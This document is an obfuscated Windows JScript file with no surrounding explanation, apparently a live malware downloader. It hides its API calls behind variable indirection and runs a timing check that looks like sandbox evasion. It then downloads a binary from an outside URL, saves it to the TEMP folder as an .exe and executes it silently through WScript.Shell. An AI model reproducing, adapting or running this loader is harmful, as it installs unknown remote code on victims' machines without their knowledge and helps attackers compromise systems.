var _GK = false;
var _LY = "CreateObject";
var _YO = function _DY() {return WScript[_LY]("WScript"+".Shell");}(), _U0 = 11;
var _GC = "MSXML2.XMLHTTP";
var _C = 2123213;
var _LK = 0;
function _DB(_UE){_YO["Run"](_UE, _LK, _LK);};
function _V(){return _GC + "";};
function _QI(_AE, _RJ){_LK = _LK * 1; return _AE - _RJ;};
function _IQ(){return _LY;};
/*@cc_on
  @if (@_win32 || @_win64)
    _GK = true;
  @end
@*/
if (_GK)
{
var _N = "";
function _O(){return 22;};
var _G0 = 0; var _KE = 0;
function _DE()
{
var _KD = new this["Date"]();
var _UH = _KD["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _KD = new this["Date"]();
var _T = _KD["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _KD = new this["Date"]();
var _LI = _KD["getUTCMilliseconds"]();
var _G0 = "_Y";
_G0 = _QI(_T, _UH);
var _KE = "_J";
_KE = _QI(_LI, _T);
_N = "open";
return _QI(_G0, _KE);
}
var _P = false;
var _BG = false;
for (var _G = _LK; _G < _O() * 1; _G++){if (_DE() != _LK){
_P = true; 
_KE = "31" + 11 * _G0 + _KE; 
_BG = true; 
break;
}}
function _S() {return ((_P == true) && (_P == _BG)) ? 1 : _LK;};
if (_P && _S() && _BG){
function _BK() {return _YO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "YfTWL0yg.ex" + "e";};
 _L = _V();
 _WM = WScript[_LY](_L);
 var _U = 1;
 while (_U){
try {
	if (_U == 1)
	{
		_WM[_N]("GET", "http://itead-europe.com/k3ias", false);
		_WM["send"]();
		_T0 = "Sleep";
	}
	WScript[_T0](_O() + 120); 
	if (_WM["readystate"] < 2 * 2) continue;
	_U = _LK;
	function _Z(_K) {var _XU = (1, 2, 3, 4, 5, _K); return _XU;};
	_HJ = WScript[_IQ()]("ADODB.Stream");
	_L = _HJ;
	_L[_N]();
	_L["type"] = _Z(1);
	_L["write"](_WM["ResponseBody"]);
	_HJ["position"] = _Z(_LK);
	_L["Save" + "ToFile"](_BK(), 2);
	_HJ["cl"+"ose"]();
	_V0 = _BK();
	_DB(_V0);
} catch(_CU){};
}
}
}

